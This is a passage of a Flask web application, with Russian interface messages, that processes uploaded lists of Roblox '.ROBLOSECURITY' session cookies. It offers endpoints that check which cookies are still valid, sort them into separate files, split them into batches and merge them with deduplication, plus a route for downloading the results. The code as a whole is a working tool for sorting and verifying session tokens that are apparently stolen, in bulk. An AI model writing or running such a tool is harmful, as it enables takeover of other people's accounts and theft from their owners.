    return jsonify({"success": ok, "new_cookie": new_cookie, "log": log_text})

# ===== ВАЛИДАТОР =====
@app.route("/api/validate", methods=["POST"])
def api_validate():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if '_|WARNING' in line and len(line) > 100:
            cookies.append(line)
        elif '.ROBLOSECURITY' in line and len(line) > 100:
            cookies.append(line)
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    valid = []
    invalid = []
    for c in cookies[:20]:
        info = get_full_info(c)
        if info['status'] == '✅':
            valid.append(c)
        else:
            invalid.append(c)
    
    if valid:
        filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid))
        return jsonify({
            "success": True,
            "total": len(cookies),
            "valid": len(valid),
            "invalid": len(invalid),
            "download_url": f"/downloads/{filename}"
        })
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "valid": 0,
        "invalid": len(cookies)
    })

# ===== СОРТЕР =====
@app.route("/api/sorter", methods=["POST"])
def api_sorter():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if '_|WARNING' in line and len(line) > 100:
            cookies.append(line)
        elif '.ROBLOSECURITY' in line and len(line) > 100:
            cookies.append(line)
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, cookie in enumerate(cookies[:50]):
            zf.writestr(f"cookie_{i+1}.txt", cookie)
    zip_buffer.seek(0)
    
    filename = f"sorted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with open(f"downloads/{filename}", 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "download_url": f"/downloads/{filename}"
    })

# ===== РАЗДЕЛИТЕЛЬ =====
@app.route("/api/split", methods=["POST"])
def api_split():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "Файл не найден"})
    file = request.files['file']
    content = file.read().decode('utf-8', errors='ignore')
    
    cookies = []
    for line in content.split('\n'):
        line = line.strip()
        if '_|WARNING' in line and len(line) > 100:
            cookies.append(line)
        elif '.ROBLOSECURITY' in line and len(line) > 100:
            cookies.append(line)
    
    if not cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    parts = 5
    chunk_size = max(1, len(cookies) // parts)
    chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
    
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, chunk in enumerate(chunks[:5]):
            zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
    zip_buffer.seek(0)
    
    filename = f"split_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with open(f"downloads/{filename}", 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    return jsonify({
        "success": True,
        "total": len(cookies),
        "download_url": f"/downloads/{filename}"
    })

# ===== СЛИЯНИЕ =====
@app.route("/api/merge", methods=["POST"])
def api_merge():
    if 'files' not in request.files:
        return jsonify({"success": False, "message": "Файлы не загружены"})
    files = request.files.getlist('files')
    if len(files) < 2:
        return jsonify({"success": False, "message": "Минимум 2 файла"})
    
    all_cookies = []
    filenames = []
    for f in files:
        content = f.read().decode('utf-8', errors='ignore')
        filenames.append(f.filename)
        for line in content.split('\n'):
            line = line.strip()
            if '_|WARNING' in line and len(line) > 100:
                all_cookies.append(line)
            elif '.ROBLOSECURITY' in line and len(line) > 100:
                all_cookies.append(line)
    
    if not all_cookies:
        return jsonify({"success": False, "message": "Куки не найдены"})
    
    unique_cookies = list(dict.fromkeys(all_cookies))
    
    filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(f"downloads/{filename}", 'w', encoding='utf-8') as f:
        f.write('\n'.join(unique_cookies))
    
    return jsonify({
        "success": True,
        "merged": len(files),
        "total": len(unique_cookies),
        "duplicates": len(all_cookies) - len(unique_cookies),
        "download_url": f"/downloads/{filename}"
    })

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
